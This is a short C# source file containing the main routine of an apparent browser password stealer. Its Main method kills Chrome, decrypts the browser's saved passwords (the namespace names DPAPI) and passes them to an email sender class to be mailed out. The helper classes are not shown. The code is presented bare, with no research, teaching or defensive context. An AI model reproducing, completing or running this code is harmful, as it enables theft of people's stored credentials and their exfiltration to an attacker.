namespace dpapiPass
{
    class MainClass
    {
        static void Main(string[] args)
        {
            ChromePasswordDecrypt chromePasswordDecrypt = new ChromePasswordDecrypt();
            PassEmailSender passEmailSender = new PassEmailSender();
            chromePasswordDecrypt.runParametrs(args);
            chromePasswordDecrypt.killChromeProcess();
            chromePasswordDecrypt.onCreateFile();
            chromePasswordDecrypt.decryptPass();
            passEmailSender.sendMail(chromePasswordDecrypt);
        }
    }
}
